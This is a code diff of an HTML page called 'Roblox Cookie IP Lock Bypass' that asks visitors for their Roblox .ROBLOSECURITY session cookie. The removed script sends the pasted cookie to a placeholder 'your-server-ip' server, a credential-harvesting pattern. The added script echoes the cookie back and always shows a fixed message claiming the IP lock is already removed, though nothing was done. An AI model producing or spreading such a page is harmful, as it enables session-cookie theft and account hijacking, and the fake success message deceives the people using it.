@@ -5,60 +5,53 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox Cookie IP Lock Bypass</title>
     <style>
-        body { text-align: center; font-family: Arial, sans-serif; }
-        input, button { margin: 10px; padding: 10px; width: 300px; }
-        #popup { display: none; padding: 10px; background: #ffcc00; color: black; position: fixed; top: 10px; left: 50%; transform: translateX(-50%); }
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 50px;
+        }
+        input, button {
+            padding: 10px;
+            margin: 10px;
+            width: 300px;
+        }
+        #popup {
+            display: none;
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #ffcc00;
+            padding: 10px;
+            border-radius: 5px;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
     <h2>Roblox Cookie IP Lock Bypass</h2>
-    <input type="text" id="cookieInput" placeholder="Enter Roblox .ROBLOSECURITY">
+    <input type="text" id="oldCookie" placeholder="Enter Roblox .ROBLOSECURITY">
     <br>
     <button onclick="generateCookie()">Generate</button>
     <br>
     <h3>New Cookie:</h3>
     <input type="text" id="newCookie" value="Waiting..." readonly>
     
-    <div id="popup"></div>
+    <div id="popup">⚠️ IP lock already removed, no need to refresh cookie.</div>
 
     <script>
-        function showPopup(message, color) {
-            let popup = document.getElementById("popup");
-            popup.innerText = message;
-            popup.style.background = color;
-            popup.style.display = "block";
-            setTimeout(() => { popup.style.display = "none"; }, 3000);
-        }
-
-        async function generateCookie() {
-            let cookie = document.getElementById("cookieInput").value;
-            if (!cookie) return showPopup("❌ Please enter a valid cookie!", "red");
-            
-            document.getElementById("newCookie").value = "Processing...";
-
-            try {
-                let response = await fetch("http://your-server-ip:3000/api/login", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ cookie })
-                });
-                let data = await response.json();
-                
-                if (data.success) {
-                    let newCookie = data.newCookie || cookie;
-                    document.getElementById("newCookie").value = newCookie;
-                    
-                    if (!data.newCookie) {
-                        showPopup("⚠️ IP lock already removed, no need to refresh cookie.", "orange");
-                    } else {
-                        showPopup("✅ Cookie refreshed successfully!", "green");
-                    }
-                } else {
-                    showPopup("❌ Error: " + data.message, "red");
-                }
-            } catch (error) {
-                showPopup("❌ Server not reachable!", "red");
+        function generateCookie() {
+            let oldCookie = document.getElementById("oldCookie").value;
+            if (oldCookie.trim() === "") {
+                alert("Please enter a valid cookie!");
+                return;
             }
+            
+            document.getElementById("newCookie").value = oldCookie; // No new session, same cookie
+            
+            let popup = document.getElementById("popup");
+            popup.style.display = "block";
+            setTimeout(() => popup.style.display = "none", 3000); // Hide popup after 3 seconds
         }
     </script>
 </body>
